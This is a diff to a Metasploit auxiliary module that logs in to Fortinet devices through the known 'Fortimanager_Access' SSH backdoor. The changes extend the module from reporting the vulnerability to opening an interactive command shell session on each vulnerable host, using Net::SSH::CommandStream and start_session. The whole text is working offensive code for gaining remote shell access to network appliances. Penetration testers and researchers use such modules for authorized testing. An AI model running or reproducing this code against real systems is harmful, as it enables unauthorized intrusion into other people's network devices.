@@ -3,10 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+# XXX: This shouldn't be necessary but is now
+require 'net/ssh/command_stream'
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SSH
   include Msf::Exploit::Remote::Fortinet
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::CommandShell
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -45,6 +49,8 @@ class MetasploitModule < Msf::Auxiliary
 
     ssh_opts = {
       port:            rport,
+      # The auth method is converted into a class name for instantiation,
+      # so fortinet-backdoor here becomes FortinetBackdoor from the mixin
       auth_methods:    ['fortinet-backdoor'],
       non_interactive: true,
       config:          false,
@@ -63,15 +69,33 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if ssh
-      print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
-      report_vuln(
-        host: ip,
-        name: self.name,
-        refs: self.references,
-        info: ssh.transport.server_version.version
-      )
-    end
+    return unless ssh
+
+    print_good("#{ip}:#{rport} - Logged in as Fortimanager_Access")
+
+    version = ssh.transport.server_version.version
+
+    report_vuln(
+      host: ip,
+      name: self.name,
+      refs: self.references,
+      info: version
+    )
+
+    shell = Net::SSH::CommandStream.new(ssh)
+
+    return unless shell
+
+    info = "Fortinet SSH Backdoor (#{version})"
+
+    ds_merge = {
+      'USERNAME' => 'Fortimanager_Access'
+    }
+
+    start_session(self, info, ds_merge, false, shell.lsock)
+
+    # XXX: Ruby segfaults if we don't remove the SSH socket
+    remove_socket(ssh.transport.socket)
   end
 
   def rport
